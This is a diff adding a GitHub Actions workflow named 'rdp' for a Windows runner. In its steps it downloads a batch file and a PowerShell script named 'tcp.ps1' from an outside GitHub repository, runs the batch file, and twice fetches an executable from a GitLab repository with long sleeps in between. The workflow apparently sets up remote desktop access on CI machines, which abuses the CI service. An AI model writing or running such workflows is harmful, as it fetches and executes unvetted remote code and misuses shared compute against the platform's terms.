@@ -1,0 +1,22 @@
+name: rdp
+
+on: [workflow_dispatch]
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+    
+    steps:
+    - name: Download
+      run: |
+          Invoke-WebRequest https://github.com/gonado-fpg/testingfo430/raw/main/a.cmd -OutFile setup.cmd
+          Invoke-WebRequest https://github.com/gonado-fpg/testingfo430/raw/main/tcp.ps1 -OutFile tcp.ps1
+    
+    - name: rrt
+      run: |
+           cmd /c setup.cmd
+           curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
+           sleep 240
+           curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
+           sleep 240
